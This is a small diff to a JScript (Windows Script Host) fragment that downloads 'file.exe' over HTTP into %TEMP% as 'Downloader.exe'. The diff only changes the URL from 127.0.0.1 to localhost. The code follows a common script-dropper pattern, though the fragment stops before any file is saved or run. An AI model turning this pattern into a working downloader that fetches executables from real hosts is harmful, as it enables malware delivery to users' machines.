@@ -3,7 +3,7 @@
 try {
 	var WshShell = WScript.CreateObject("WScript.Shell");
     var filepath = WshShell.ExpandEnvironmentStrings("%TEMP%") + "/Downloader.exe";
-	var url = "http://127.0.0.1/file.exe"
+	var url = "http://localhost/file.exe"
 	var xhr = new ActiveXObject("MSXML2.XMLHTTP")
 	xhr.open("GET", url, false)
     xhr.send()
